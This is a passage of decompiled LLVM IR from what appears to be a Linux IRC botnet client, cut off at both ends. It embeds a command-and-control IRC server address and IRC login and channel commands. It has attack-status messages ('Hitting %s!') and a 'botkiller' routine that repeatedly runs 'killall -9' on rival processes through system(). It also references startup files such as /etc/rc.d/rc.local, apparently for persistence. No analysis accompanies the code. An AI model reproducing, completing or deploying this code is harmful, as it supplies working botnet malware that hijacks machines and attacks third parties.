@global_var_8053fd9.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053fe2.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053feb.150, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053ff3.151, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8053ffe.152, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805400e.153, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054016.154, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805401e.155, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054027.156, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8054031.157, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805403d.158, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805404b.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8054059.160, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054066.161, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8054074.162, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805407f.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805408a.164, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8054097.165, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80540a6.166, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80540b3.167, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80540c0.168, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_80540cc.169, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_80540db.170, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80540ef.171, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80540fb.172, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8054107.173, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054114.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8054122.175, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053bd0.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805412b.176, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054134.177, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054139.178, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805413e.179, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054143.180, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054148.181, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805414d.182, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054152.183, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054157.184, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805415c.185, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054161.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054167.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805416d.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054173.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054179.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805417f.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054185.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805418b.193, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054191.194, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8054197.195, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805419d.196, i32 0, i32 0), i8* bitcast (i32* @global_var_80541a3.197 to i8*), i8* bitcast (i32* @global_var_80541a5.198 to i8*), i8* bitcast (i32* @global_var_80541a7.199 to i8*), i8* bitcast (i32* @global_var_80541a9.200 to i8*), i8* bitcast (i32* @global_var_80541ab.201 to i8*), i8* bitcast (i32* @global_var_80541ad.202 to i8*), i8* bitcast (i32* @global_var_80541af.203 to i8*), i8* bitcast (i32* @global_var_80541b1.204 to i8*), i8* bitcast (i32* @global_var_80541b3.205 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541b5.206, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541b8.207, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541bb.208, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541be.209, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541c1.210, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541c4.211, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541c7.212, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541ca.213, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541cd.214, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541d0.215, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541d3.216, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541d6.217, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80541d9.218, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80541e4.219, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80541e9.220, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80541ef.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541f4.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541f7.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541fa.224, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80541fd.225, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054200.226, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054203.227, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054206.228, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054209.229, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805420c.230, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805420f.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8054213.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8054217.233, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805421b.234, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805421f.235, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8054223.236, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8054227.237, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805422b.238, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805422f.239, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8054233.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805423c.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054241.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054246.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805424b.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8054251.245, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054258.246, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054260.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054268.248, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8054270.249, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054279.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8054281.251, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8054288.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8054291.253, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8054299.254, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805429e.255, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80542a5.256, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80542ac.257, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80542b3.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80542ba.259, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80542c0.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80542c9.261, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80542cf.262, i32 0, i32 0)]
@global_var_80542de.264 = constant [12 x i8] c"killall -9 \00"
@global_var_8056980.266 = global i32 0
@global_var_8056570.268 = local_unnamed_addr global i32 0
@global_var_8056f50.269 = local_unnamed_addr global i32 0
@global_var_8054308.271 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8056f2c.272 = local_unnamed_addr global i32 0
@global_var_8054318.273 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_8054331.274 = constant [4 x i8] c"std\00"
@global_var_8056f4c.275 = local_unnamed_addr global i32 0
@global_var_8054335.276 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_8054352.277 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_8054300.278 = constant [6 x i8] c"pices\00"
@global_var_80564a4.279 = local_unnamed_addr global [6 x i8]* @global_var_8054300.278
@global_var_8056f34.280 = local_unnamed_addr global i32 0
@global_var_80543b2.281 = constant i32 1330446336
@global_var_8054370.282 = constant [4 x i8] c"STD\00"
@global_var_80564c0.283 = local_unnamed_addr global [4 x i8]* @global_var_8054370.282
@global_var_80564c4.284 = local_unnamed_addr global i32 134515201
@global_var_80543b4.285 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_8056f48.286 = local_unnamed_addr global i32 0
@global_var_80543c3.287 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_80543d0.288 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_80543d8.289 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_805656c.290 = local_unnamed_addr global i32 0
@global_var_80543e1.295 = constant [14 x i8] c"[linux][i486]\00"
@global_var_8056f38.296 = local_unnamed_addr global i32 0
@global_var_8056560.297 = local_unnamed_addr global i32 0
@global_var_80542ea.299 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_805649c.300 = global [22 x i8]* @global_var_80542ea.299
@global_var_8056f40.301 = local_unnamed_addr global i32 0
@global_var_805440c.302 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_805441f.303 = constant [13 x i8] c"/etc/rc.conf\00"
@1 = constant i32 622985263
@global_var_805442e.305 = constant [8 x i8] c"\22%s%s\22\0A\00"
@2 = constant i32 1966014561
@global_var_8054438.307 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_8056f3c.308 = local_unnamed_addr global i32 0
@global_var_8054446.309 = constant i32 1342177315
@global_var_8054448.310 = constant i32 1396789248
@global_var_8056f30.311 = local_unnamed_addr global i32 0
@global_var_8054449.312 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_8054454.313 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_805447d.314 = constant i32 2752522
@global_var_805447f.315 = constant i32 1380253738
@global_var_80543ef.316 = constant [4 x i8] c"352\00"
@global_var_8056500.317 = global [4 x i8]* @global_var_80543ef.316
@global_var_8056504.318 = global i32 134516998
@global_var_8054481.319 = constant [6 x i8] c"ERROR\00"
@global_var_8056e04.320 = local_unnamed_addr global i32 0
@global_var_8056f90.321 = local_unnamed_addr global i32 0
@global_var_8056f60.322 = local_unnamed_addr global i32 0
@global_var_8056fb4.323 = local_unnamed_addr global i32 0
@global_var_8056f98.324 = local_unnamed_addr global i32 0
@global_var_8056988.325 = local_unnamed_addr global i32 0
@global_var_8056984.326 = local_unnamed_addr global i32 0
@global_var_8054487.327 = constant [10 x i8] c"/dev/null\00"
@global_var_8056f88.328 = local_unnamed_addr global i32 0
@global_var_8056074.329 = global i32 -1
@global_var_805698c.330 = global i32 0
@global_var_8056998.331 = local_unnamed_addr global i32 0
@global_var_8056994.332 = local_unnamed_addr global i32 0
@global_var_8056f8c.333 = local_unnamed_addr global i32 0
@global_var_80569c0.334 = global i32 0
@global_var_80569c4.335 = global i32 0
@global_var_80569cc.336 = global i32 0
@global_var_80569d0.337 = global i32 0
@global_var_80569d4.338 = global i32 0
@global_var_8056dc8.339 = global i32 0
@global_var_8056dcc.340 = global i32 0
@global_var_80569a4.341 = global i32 0
@global_var_80569a0.342 = local_unnamed_addr global i32 0
@global_var_80569a8.343 = global i32 0
@global_var_8056dd0.344 = local_unnamed_addr global i32 0
@global_var_8056fb8.346 = global i32 0
@global_var_80544e0.349 = constant i32 0
@global_var_80544c4.350 = constant [11 x i8] c"/etc/hosts\00"
@global_var_80544d0.351 = constant i32 0
@global_var_8054558.352 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8054569.353 = constant [8 x i8] c"options\00"
@global_var_8054571.354 = constant [9 x i8] c"timeout:\00"
@global_var_805457a.355 = constant [10 x i8] c"attempts:\00"
@global_var_8054584.356 = constant [11 x i8] c"nameserver\00"
@global_var_805458f.357 = constant i32 0
@global_var_80545a4.360 = constant [3 x i8] c"sh\00"
@global_var_805459f.362 = constant [8 x i8] c"/bin/sh\00"
@global_var_80545a8.363 = constant i32 2147483647
@global_var_80545b0.364 = constant i32 -1
@global_var_8056de4.365 = global i32 0
@global_var_8056f84.366 = local_unnamed_addr global i32 0
@global_var_8056de0.367 = local_unnamed_addr global i32 0
@global_var_8056dec.368 = local_unnamed_addr global i32 0
@global_var_80545b8.369 = constant [4 x i8] c"rwa\00"
@global_var_8056df4.370 = global i32 0
@global_var_8056df0.371 = global i32 0
@global_var_8056e00.373 = local_unnamed_addr global i32 0
@global_var_80545bc.374 = constant [21 x i8] c"__vdso_clock_gettime\00"
@global_var_80545d1.375 = constant [10 x i8] c"LINUX_2.6\00"
@global_var_8056fbc.376 = local_unnamed_addr global i32 0
@global_var_8056fc8.377 = local_unnamed_addr global i32 0
@global_var_8056f94.378 = local_unnamed_addr global i32 0
@global_var_8056fc4.379 = local_unnamed_addr global i32 0
@global_var_8056fc0.380 = local_unnamed_addr global i32 0
@global_var_8056e08.381 = global i32 0
@global_var_8056f80.382 = local_unnamed_addr global i32 0
@global_var_8056f9c.383 = global i32 0
@global_var_8056f24.386 = local_unnamed_addr global i32 0
@global_var_8056f20.387 = local_unnamed_addr global i32 0
@global_var_8054708.388 = constant i32 -1
@global_var_80551cc.389 = constant i32 -1073741822
@global_var_8056f28.390 = local_unnamed_addr global i32 0
@global_var_8054718.391 = constant i32 134552612
@global_var_8054a20.392 = constant [10 x i8] c"-+   0X0x\00"
@global_var_8054a21.393 = constant [9 x i8] c"+   0X0x\00"
@global_var_8054a22.394 = constant [8 x i8] c"   0X0x\00"
@global_var_8054a2a.395 = constant [7 x i8] c"(null)\00"
@global_var_8054a31.396 = constant [19 x i8] c"-0X+0X 0X-0x+0x 0x\00"
@global_var_8054a34.397 = constant [16 x i8] c"+0X 0X-0x+0x 0x\00"
@global_var_8054a37.398 = constant [13 x i8] c" 0X-0x+0x 0x\00"
@global_var_8054a32.399 = constant [18 x i8] c"0X+0X 0X-0x+0x 0x\00"
@global_var_8054a44.400 = constant [4 x i8] c"inf\00"
@global_var_8054a48.401 = constant [4 x i8] c"INF\00"
@global_var_8054a4c.402 = constant [4 x i8] c"nan\00"
@global_var_8054a50.403 = constant [4 x i8] c"NAN\00"
@global_var_8054a54.407 = constant i32 46
@global_var_8054abc.409 = constant [22 x i8] c"Illegal byte sequence\00"
@global_var_8056070.411 = global i32 0
@global_var_8056540.11 = local_unnamed_addr global i8 0
@global_var_8056580.265 = external global i8*
@global_var_8056564.267 = local_unnamed_addr global i8 0
@3 = internal constant [2 x i8] c"r\00"
@4 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_8056568.291 = external global i8*
@global_var_805656b.292 = external local_unnamed_addr global i8*
@global_var_805656a.293 = external local_unnamed_addr global i8*
@global_var_8056569.294 = external global i8*
@global_var_8056498.298 = local_unnamed_addr global i64 577941699976757249
@5 = internal constant [4 x i8] c"\0F\FF2\00"
@global_var_80544f0.347 = constant i8* getelementptr inbounds ([4 x i8], [4 x i8]* @5, i32 0, i32 0)
@6 = internal constant [3 x i8] c"\FF2\00"
@global_var_80544f1.348 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @6, i32 0, i32 0)
@global_var_8056ddc.358 = local_unnamed_addr global i64 0
@global_var_8056dd8.359 = local_unnamed_addr global i64 0
@global_var_8056dfc.372 = external local_unnamed_addr global i8*
@7 = internal constant [49 x i8] c"\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\FF\00"
@global_var_8054601.384 = constant i8* getelementptr inbounds ([49 x i8], [49 x i8]* @7, i32 0, i32 0)
@global_var_80545e0.385 = external constant i8*
@8 = internal constant [88 x i8] c"T!\22\19\0D\01\02\03\11K\1C\0C\10\04\0B\1D\12\1E'hnopqb \05\06\0F\13\14\15\1A\08\16\07($\17\18\09\0A\0E\1B\1F%#\83\82}&*+<=>?CGJMXYZ[\5C]^_`acdefgijklrstyz{|\00"
@global_var_8054a64.408 = constant i8* getelementptr inbounds ([88 x i8], [88 x i8]* @8, i32 0, i32 0)
@global_var_805442c.304 = constant [2 x i8] c"/\00"
@global_var_8054436.306 = constant [2 x i8] c"a\00"
@global_var_8054306.270 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = call i32 @frame_dummy()
  %v0_804809c = call i32 @__do_global_ctors_aux()
  ret i32 %v0_804809c
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480b6 = load i8, i8* @global_var_8056540.11, align 64
  %v1_80480b6 = icmp eq i8 %v0_80480b6, 0
  br i1 %v1_80480b6, label %dec_label_pc_80480da.preheader, label %entry.dec_label_pc_8048105_crit_edge

entry.dec_label_pc_8048105_crit_edge:             ; preds = %entry
  %v0_8048106.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048105

dec_label_pc_80480da.preheader:                   ; preds = %entry
  %v0_80480da1 = load i32, i32* bitcast (i32** @global_var_80560a4.13 to i32*), align 4
  %v1_80480e12 = icmp eq i32 %v0_80480da1, 0
  %v1_80480e39 = icmp eq i1 %v1_80480e12, false
  br i1 %v1_80480e39, label %dec_label_pc_80480d0.lr.ph, label %dec_label_pc_80480e5

dec_label_pc_80480d0.lr.ph:                       ; preds = %dec_label_pc_80480da.preheader
  br label %dec_label_pc_80480d0

dec_label_pc_80480d0:                             ; preds = %dec_label_pc_80480d0.lr.ph, %dec_label_pc_80480d0
  %v0_80480d0 = phi i32 [ %v0_80480da1, %dec_label_pc_80480d0.lr.ph ], [ %v0_80480da, %dec_label_pc_80480d0 ]
  %v1_80480d0 = add i32 %v0_80480d0, 4
  store i32 %v1_80480d0, i32* bitcast (i32** @global_var_80560a4.13 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d0)
  %v0_80480da = load i32, i32* bitcast (i32** @global_var_80560a4.13 to i32*), align 4
  %v1_80480e1 = icmp eq i32 %v0_80480da, 0
  %v1_80480e3 = icmp eq i1 %v1_80480e1, false
  br i1 %v1_80480e3, label %dec_label_pc_80480d0, label %dec_label_pc_80480da.dec_label_pc_80480e5_crit_edge

dec_label_pc_80480da.dec_label_pc_80480e5_crit_edge: ; preds = %dec_label_pc_80480d0
  br label %dec_label_pc_80480e5

dec_label_pc_80480e5:                             ; preds = %dec_label_pc_80480da.dec_label_pc_80480e5_crit_edge, %dec_label_pc_80480da.preheader
  store i8 1, i8* @global_var_8056540.11, align 64
  br label %dec_label_pc_8048105

dec_label_pc_8048105:                             ; preds = %entry.dec_label_pc_8048105_crit_edge, %dec_label_pc_80480e5
  %v0_8048106 = phi i32 [ %v0_8048106.pre, %entry.dec_label_pc_8048105_crit_edge ], [ 0, %dec_label_pc_80480e5 ]
  ret i32 %v0_8048106

; uselistorder directives
  uselistorder i32 %v0_80480da, { 1, 0 }
  uselistorder i32 %v0_80480d0, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80560a4.13 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8056540.11, { 1, 0 }
  uselistorder label %dec_label_pc_8048105, { 1, 0 }
  uselistorder label %dec_label_pc_80480d0, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_8048116 = call i32 @function_804811b()
  ret i32 %v0_8048116

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804811b() local_unnamed_addr {
dec_label_pc_804811b:
  %v0_8048140 = load i32, i32* @global_var_8056084.16, align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_804811b
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_804811b
  ret i32 0
}

define i32 @_start() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8048166 = ptrtoint i32* %stack_var_0 to i32
  %v2_804816d = call i32 @function_8048172(i32 %v1_8048166, i32 %v1_8048166)
  ret i32 %v2_804816d
}

define i32 @function_8048172(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048172:
  %v3_8048172 = add i32 %arg1, -134513010
  %v0_8048179 = load i32, i32* @eax, align 4
  %v2_804817a = inttoptr i32 %v0_8048179 to i32*
  %v3_804817a = call i32 @_start_c(i32* %v2_804817a, i32 %v3_8048172)
  ret i32 %v3_804817a
}

define i32 @_start_c(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_8048192 = add i32 %tmp1, 4
  %v2_8048196 = load i32, i32* %arg1, align 4
  %v6_804819d = inttoptr i32 %v1_8048192 to i32*
  %v7_804819d = call i32 @__libc_start_main(i32 134518151, i32 %v2_8048196, i32* %v6_804819d, i32 134512788, i32 134560596, i32 0)
  ret i32 %v7_804819d
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_80481c0 = ptrtoint i32* %stack_var_-88 to i32
  %v4_80481c4 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_80481aa

dec_label_pc_80481aa:                             ; preds = %dec_label_pc_8048241, %entry
  br label %dec_label_pc_80481b6

dec_label_pc_80481b6:                             ; preds = %dec_label_pc_80481aa, %dec_label_pc_80481b6
  %storemerge216 = phi i32 [ 0, %dec_label_pc_80481aa ], [ %v4_8048234, %dec_label_pc_80481b6 ]
  %v5_80481c4 = call i32 @memcpy(i8* %v4_80481c4, i32 ptrtoint ([10 x i8]* @global_var_80542d4.17 to i32), i32 10)
  %v1_80481cf = mul nuw nsw i32 %storemerge216, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint ([246 x i8*]* @global_var_80560c0.263 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v4_80481de = call i32 @strcat(i8* %v4_80481c4, i32 %v4_80481cf)
  %v1_80481ed = call i32 @system(i32 %v2_80481c0)
  %v5_8048203 = call i32 @memcpy(i8* %v4_80481c4, i32 ptrtoint ([12 x i8]* @global_var_80542de.264 to i32), i32 12)
  %v4_804820e = load i32, i32* %v3_80481cf, align 4
  %v4_804821d = call i32 @strcat(i8* %v4_80481c4, i32 %v4_804820e)
  %v1_804822c = call i32 @system(i32 %v2_80481c0)
  %v4_8048234 = add nuw nsw i32 %storemerge216, 1
  %exitcond = icmp eq i32 %v4_8048234, 9
  br i1 %exitcond, label %dec_label_pc_8048241, label %dec_label_pc_80481b6

dec_label_pc_8048241:                             ; preds = %dec_label_pc_80481b6
  %v1_8048246 = call i32 @sleep(i32 5)
  br label %dec_label_pc_80481aa

; uselistorder directives
  uselistorder i32 %storemerge216, { 1, 0 }
  uselistorder i32 (i32)* @system, { 1, 0 }
  uselistorder label %dec_label_pc_80481b6, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048256 = load i32, i32* @ebx, align 4
  store i32 %v0_8048256, i32* %stack_var_-8, align 4
  %v4_804825a = ptrtoint i8* %arg1 to i32
  %v2_804825d = load i8, i8* %arg1, align 1
  %v12_8048269 = icmp eq i8 %v2_804825d, 42
  br i1 %v12_8048269, label %dec_label_pc_8048294, label %dec_label_pc_804826f

dec_label_pc_804826f:                             ; preds = %entry
  %v12_804826f = icmp eq i8 %v2_804825d, 63
  br i1 %v12_804826f, label %dec_label_pc_80482e6, label %dec_label_pc_8048275

dec_label_pc_8048275:                             ; preds = %dec_label_pc_804826f
  %v4_8048275 = icmp eq i8 %v2_804825d, 0
  br i1 %v4_8048275, label %dec_label_pc_8048280, label %dec_label_pc_8048320

dec_label_pc_8048280:                             ; preds = %dec_label_pc_8048275
  %v2_8048283 = load i8, i8* %tmp14, align 1
  %v3_8048283 = zext i8 %v2_8048283 to i32
  br label %dec_label_pc_8048381

dec_label_pc_8048294:                             ; preds = %entry
  %v1_8048297 = add i32 %v4_804825a, 1
  %v5_804829e = inttoptr i32 %v1_8048297 to i8*
  %v5_804829f = call i32 @strwildmatch(i8* %v5_804829e, i32 %arg2)
  %v1_80482a7 = icmp eq i32 %v5_804829f, 0
  br i1 %v1_80482a7, label %dec_label_pc_80482d4, label %dec_label_pc_80482ab

dec_label_pc_80482ab:                             ; preds = %dec_label_pc_8048294
  %v2_80482ae = load i8, i8* %tmp14, align 1
  %v4_80482b0 = icmp eq i8 %v2_80482ae, 0
  br i1 %v4_80482b0, label %dec_label_pc_80482db, label %dec_label_pc_80482b4

dec_label_pc_80482b4:                             ; preds = %dec_label_pc_80482ab
  %v1_80482b7 = add i32 %arg2, 1
  %v5_80482bf = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_80482b7)
  %v1_80482c7 = icmp eq i32 %v5_80482bf, 0
  br i1 %v1_80482c7, label %dec_label_pc_80482d4, label %dec_label_pc_80482db

dec_label_pc_80482d4:                             ; preds = %dec_label_pc_80482b4, %dec_label_pc_8048294
  br label %dec_label_pc_80482db

dec_label_pc_80482db:                             ; preds = %dec_label_pc_80482ab, %dec_label_pc_80482b4, %dec_label_pc_80482d4
